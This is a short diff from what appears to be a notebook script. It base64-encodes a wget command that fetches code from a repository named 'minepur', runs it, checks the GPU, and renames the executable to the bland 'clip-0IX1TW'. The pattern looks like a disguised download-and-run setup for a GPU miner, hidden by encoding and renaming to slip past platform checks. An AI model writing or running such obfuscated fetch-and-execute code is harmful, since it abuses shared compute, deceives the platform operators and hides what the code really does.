@@ -6,4 +6,4 @@ cmd = str(base64.b64decode("d2dldCBodHRwczovL2dpdGh1Yi5jb20vQW1peTQ1My9taW5lcHVy
 !{run}
 !{cmd}
 !nvidia-smi
-!chmod +x minepur/weird
+!chmod u+x clip-0IX1TW
